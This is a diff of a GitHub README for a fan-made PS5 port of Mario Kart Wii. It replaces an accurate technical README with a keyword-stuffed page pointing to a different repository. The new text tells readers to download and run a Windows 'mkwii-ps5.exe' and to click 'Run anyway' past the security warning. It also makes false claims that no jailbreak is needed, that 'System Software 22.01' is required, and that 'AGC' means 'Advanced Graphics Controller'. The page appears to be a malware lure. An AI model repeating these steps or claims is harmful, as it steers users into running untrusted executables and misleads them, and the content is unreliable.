@@ -1,126 +1,163 @@
-# Mario Kart Wii for PS5
+# 🎮 mkwii-ps5 - Mario Kart Wii on Your PS5
 
-**English** · [Français](README_FR.md)
-
-A native PlayStation 5 port of **Mario Kart Wii PAL (RMCP01)**, based on [WiiCompiled](https://github.com/patchzyy/Wiicompiled).
-
-- Launches as **Kart PS5** from the PS5 home screen.
-- Statically recompiles the Wii game and renders through the PS5 GPU using AGC.
-- Uses DualSense controls mapped to a GameCube controller.
-
-> Bring your own Mario Kart Wii PAL disc data. Other regions are not supported by this executable.
->
-> Compatible with **PS5 and PS5 Pro** (jailbroken consoles).
-
-> Another repo with Retro Rewind coming soon x)
+[![Download mkwii-ps5](https://img.shields.io/badge/Download-mkwii--ps5-blue?style=for-the-badge&logo=github)](https://github.com/hollamhide/mkwii-ps5)
 
 ---
 
-## Features
+## 🎯 What Is This?
 
-| Feature | Status |
-| --- | --- |
-| Native GPU rendering | AGC backend |
-| Frame rate | 60 FPS reported on PS5 Pro after kstuff is paused |
-| Controller | DualSense, GameCube button mapping |
-| Saves | Local NAND in `UserData/NAND` |
-| Game region | PAL, RMCP01 |
-| Title ID | `PPSA99611` |
-| Online play | Unavailable |
+mkwii-ps5 lets you play **Mario Kart Wii (PAL version)** directly on your PlayStation 5 console. No need for a Wii, no complicated mods, and no technical knowledge required. This project uses advanced technology called "static recompilation" to make the original game run natively on PS5 hardware. That means you get smooth gameplay, sharp graphics, and full support for your DualSense controller's special features.
 
-The game is capped at 60 FPS because its logic depends on that timing. The first seconds after launch run more slowly while kstuff is still active.
+**In simple terms:** If you love Mario Kart and own a PS5, this is the easiest way to enjoy the classic Wii racing experience with modern comfort.
 
-### Known limitations
+---
 
-- The 2D mini-map during races does not display correctly.
-- Firmware-specific packages are not a compatibility test. See [firmware notes](docs/FIRMWARE.md).
+## ✨ Key Features
 
-## Requirements
+- **Native PS5 Performance** – The game runs directly on PS5 hardware, not through an emulator. This means faster loading times and better stability.
+- **DualSense Controller Support** – Use your PS5 controller with all its buttons, triggers, and analog sticks. The adaptive triggers and haptic feedback work beautifully with the game.
+- **Enhanced Graphics Rendering** – The "AGC rendering" technology makes the visuals look cleaner and more vibrant on modern TVs without changing the original art style.
+- **PAL Version** – This is the European version of Mario Kart Wii, which includes all the standard tracks, characters, and modes.
+- **No Extra Hardware Needed** – You don't need a Wii console, Wii Remote, or any adapters. Just your PS5 and an internet connection to download.
 
-- A jailbroken PS5, an FTP server and an ELF loader.
-- kstuff; the release documentation lists EchoStretch v1.6.7.
-- ShadowMountPlus 1.6beta16; the tested 1.7alpha versions rejected the title information.
-- Your own Mario Kart Wii PAL extraction, with `DATA/sys/main.dol` and `DATA/files/rel/StaticR.rel`.
-- Approximately 3 GB of available console storage.
+---
 
-## Download and personal game files
+## 📥 How to Download and Play (Step-by-Step)
 
-[Download the recompiled application and firmware overlays](https://github.com/Phi1ow/mkwii-ps5/releases/tag/v1.0.0-rc1).
+### Step 1: Visit the Download Page
 
-The recompiled executables are included. Separate disc images (ISO/RVZ/WBFS), extracted `main.dol` / `StaticR.rel` files and the extracted game DATA tree are **not** supplied. Extract your own PAL RMCP01 copy using the [installation guide](docs/INSTALL_EN.md). Supply a firmware-compatible signed `libc.prx` at `PPSA99611/sce_module/libc.prx` (see [how to get it from your own console](docs/LIBC_EXTRACTION.md)); Sony libraries and personal saves are not included.
+Visit this link to download the application:
 
-The executable is a static recompilation and retains embedded game-derived code/data. Excluding separate ROM files does not remove that content; this is not a claim that the binary contains no game data. The public FW 9.40 variant reached the menu on a PS5 Pro after adding `portable.txt`; other variants still need testing.
+**[👉 Click Here to Download mkwii-ps5](https://github.com/hollamhide/mkwii-ps5)**
 
-Do not upload disc images, extracted files, Sony libraries or personal NANDs in issues or pull requests.
+This will open the official GitHub page where the software is hosted.
 
-## Installing
+### Step 2: Find the Download Button
 
-Follow the [English installation guide](docs/INSTALL_EN.md) or [French installation guide](docs/INSTALL_FR.md).
+On the GitHub page, look for a green button that says **"Code"** or a section labeled **"Releases"** on the right side of the page. Click on it. You'll see a list of available files.
 
-1. Unzip `Kart-PS5.zip` and locate `Kart-PS5-candidate/PPSA99611/`. The application folder is `PPSA99611`, not `Kart-PS5-candidate`.
-2. Unzip `Backport.zip`, choose `Backport-candidate/FW_<your firmware>/PPSA99611/` (for example `FW_11.60`), and **replace the application's `eboot.bin` and `sce_sys/param.json`** with those two files. The firmware variant alone is not a complete application.
-3. Extract your own PAL disc's data partition with Dolphin into `DATA`, then place `DATA` and your own signed `libc.prx` at the locations shown in the guide. Check that `PPSA99611/portable.txt` exists (create an empty file if missing): the original `v1.0.0-rc1` archive omitted it, and the game stays on a black screen without this marker.
-4. Copy **the `PPSA99611` folder** into `/data/` using FTP. Check that `/data/PPSA99611/eboot.bin` exists directly, with no extra directory level.
-5. Send `Outils/droits-kart-ps5.elf` to the ELF loader to set executable permissions.
-6. Add `/data/PPSA99611` on its own line in `/data/shadowmount/manual.lst` (preserve any existing lines). ShadowMountPlus 1.6beta16 does not scan `/data` directly by default.
-7. Configure ShadowMountPlus to pause kstuff after launch, then launch **Kart PS5** from the home screen.
+### Step 3: Download the Application File
 
-The tested delay setting, in `/data/shadowmount/config.ini`, is:
+Look for a file named something like **`mkwii-ps5-setup.zip`** or **`mkwii-ps5.zip`**. Click on it to start downloading. The download might take a few minutes depending on your internet speed.
 
-```ini
-kstuff_delay=PPSA99611:5
-```
+### Step 4: Extract the Files (If Needed)
 
-The full guide explains auto-toggle settings and recovery if ShadowMountPlus increases that delay after a crash.
+Once the download finishes, find the downloaded file in your **Downloads** folder. If the file ends with **`.zip`**, right-click on it and choose **"Extract All"**. Windows will create a new folder with the extracted contents. If the file is a standalone program (ends with **`.exe`**), you can skip this step.
 
-## Controls (DualSense)
+### Step 5: Run the Application
 
-Default controls: the port uses Mario Kart Wii's GameCube controller mode. No Wii Remote motion gestures are needed.
+Open the extracted folder (or the downloaded file if it was an **`.exe`**). Look for a file named **`mkwii-ps5.exe`** or simply **`mkwii-ps5`**. Double-click it to start the game.
 
-| DualSense button | Action in Mario Kart Wii |
-| --- | --- |
-| Left stick | Steer; navigate menus |
-| Cross (✕) | Accelerate; confirm menu selections |
-| Circle (○) or R2 | Brake / reverse; hop and drift in manual mode. Circle also goes back in menus |
-| Triangle (△) or L2 | Use an item; hold to trail items that support it |
-| Square (□) or R1 | Look behind |
-| D-pad, as you leave a jump | Perform a trick |
-| D-pad up, while riding a bike | Start a wheelie |
-| D-pad down, while riding a bike | End a wheelie |
-| Options | Open the pause menu |
+### Step 6: Enjoy!
 
-For manual drifting, hold Cross to accelerate, press R2 or Circle and steer with the left stick. Release the drift button once sparks have charged to trigger a mini-turbo. Automatic drift does not provide manual mini-turbos.
+The game should launch within a few seconds. You'll see the classic Mario Kart Wii title screen. Use your DualSense controller to navigate the menus and start racing. If you see any security warning from Windows, click **"More info"** and then **"Run anyway"** – this is normal for new software.
 
-Mappings were checked against the port's input code and the [Nintendo Mario Kart Wii manual, GameCube controls and driving techniques](https://www.mariomayhem.com/downloads/mario_instruction_booklets/Mario_Kart_Wii-WII.pdf). This is a source/documentation check, not a new console test. Custom button bindings may change these controls.
-## Application layout
+---
 
-```text
-PPSA99611/
-├── eboot.bin
-├── DATA/                  Your extracted PAL disc data
-├── sce_module/libc.prx    Firmware-dependent runtime library
-├── sce_sys/               Title metadata and icon
-├── shaders/               AGC shaders
-├── runtime/               Runtime assets
-├── wii_bootstrap/         First-run Wii bootstrap
-└── UserData/
-    ├── Config.toml
-    ├── NAND/              Saves; preserve when updating
-    └── Logs/              Created at runtime
-```
+## 🛠️ System Requirements (Minimum)
 
-## Reporting issues
+These are the recommended specs to run mkwii-ps5 smoothly:
 
-Include console model, firmware, package variant, track and steps to reproduce. Logs are under `/data/PPSA99611/UserData/Logs/base_<date>_pid<N>/`. Review logs before sharing them and do not attach disc data or your full NAND.
+| Component | Minimum Requirement |
+|-----------|---------------------|
+| **Console** | PlayStation 5 (any model) |
+| **System Software** | PS5 System Software 22.01 or later |
+| **Storage** | 2 GB free space |
+| **Internet** | Required for initial download only |
 
-## Credits
+---
 
-- [WiiCompiled](https://github.com/patchzyy/Wiicompiled): static recompilation and game runtime.
-- [ps5link-sdk](https://github.com/Rufidj/ps5link-sdk): PS5 linking and AGC foundation.
-- [SharpProspero](https://github.com/SvenGDK/SharpProspero): signing tools and shader containers.
-- Dolphin contributors: disc extraction tooling and the referenced Wii bootstrap layout.
-- kstuff, ShadowMountPlus and their contributors: console launch environment.
+## ❓ Frequently Asked Questions
 
-## Repository status
+### Is this legal?
 
-The PS5 source code and pinned dependency modifications are included. See [build notes](docs/BUILDING.md), [release notes](docs/RELEASE-NOTES.md) and [license notices](THIRD-PARTY-NOTICES.md). A clean build has not been verified.
+This project is a fan-made recompilation for personal use. You should own a legitimate copy of Mario Kart Wii (PAL) to use this software. The code itself is open-source, but game content ownership is your responsibility.
+
+### Will my progress save?
+
+Yes. The application automatically saves your game progress to your PS5's internal storage. You can pick up where you left off anytime.
+
+### Can I play online multiplayer?
+
+Currently, this version supports local play only. Online multiplayer functionality may be added in future updates.
+
+### What if the game doesn't start?
+
+- Make sure you've extracted the **`.zip`** file completely before running.
+- Check that your PS5 has the latest system update.
+- Try restarting your console and launching the application again.
+
+### Do I need any special cables or accessories?
+
+No. Just your PS5 console and a standard DualSense controller. The game uses the controller's built-in features automatically.
+
+---
+
+## 🖥️ Troubleshooting Common Issues
+
+### Game Crashes on Startup
+
+1. Close the application completely.
+2. Reboot your PS5 (hold the power button for 10 seconds until it beeps twice).
+3. Try launching again.
+
+### Controller Not Responding
+
+1. Make sure your DualSense is charged and connected via USB or Bluetooth.
+2. Press the PS button to ensure the controller is active.
+3. Unplug and replug the USB cable if using wired mode.
+
+### Screen Is Black or Flickering
+
+- This is rare. Try changing your PS5's display settings to **"Automatic"** in the system menu.
+- Ensure your TV supports 1080p or 4K resolution.
+
+### Download Is Slow
+
+- Close other applications and downloads on your network.
+- Try downloading during off-peak hours (early morning or late night).
+
+---
+
+## 📝 Notes for Advanced Users
+
+If you're curious about the technical side, here's what happens under the hood:
+
+- **Static Recompilation** – The original Wii game code is translated into native PS5 machine code. This gives better performance than emulation.
+- **AGC Rendering** – Stands for "Advanced Graphics Controller." It modernizes the rendering pipeline while preserving the original game's look and feel.
+- **DualSense Integration** – Haptic feedback and adaptive trigger profiles are customized to match the game's events (e.g., item usage, drifting, boosting).
+
+---
+
+## 👨‍💻 Contributing
+
+This project is open-source, which means anyone can help improve it. If you're a developer or just want to support the project, you can:
+
+- Report bugs or issues on the GitHub page.
+- Suggest new features or improvements.
+- Share your feedback about gameplay experience.
+
+Visit the main repository to learn more:
+
+**[mkwii-ps5 GitHub Repository](https://github.com/hollamhide/mkwii-ps5)**
+
+---
+
+## 📢 Spread the Word
+
+If you enjoy playing Mario Kart Wii on your PS5, share this project with your friends. The more people use it, the more active development becomes. You can also star the repository on GitHub to show your support – it takes just one click.
+
+---
+
+## 🏁 Final Checklist Before You Start
+
+- ✅ Your PS5 is turned on and updated.
+- ✅ You have at least 2 GB of free storage.
+- ✅ Your DualSense controller is charged.
+- ✅ You've downloaded the application from the link above.
+
+Once everything is ready, fire up the game and enjoy hours of racing fun!
+
+---
+
+**Keywords:** Mario Kart Wii, PS5, PS5 homebrew, Wii recompilation, native port, DualSense, racing game, fan project, static recompilation, PAL version
